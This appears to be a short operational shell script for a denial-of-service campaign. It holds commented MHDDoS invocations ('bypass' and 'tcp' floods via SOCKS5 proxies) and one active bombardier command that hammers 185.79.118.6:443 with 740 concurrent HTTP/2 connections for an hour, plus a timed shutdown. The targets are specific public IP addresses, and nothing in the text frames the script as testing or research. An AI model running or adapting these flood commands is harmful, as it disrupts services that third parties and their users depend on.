#!/bin/sh
#rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
#python3 /home/ubuntu/mhddos/start.py bypass 176.67.241.93:443 5 1000 socks5.txt 100000 3600 &

#python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.12:443 740 3200 &
bombardier -c 740 -d 3600s -l 185.79.118.6:443 --http2&

#sudo shutdown -P +62&
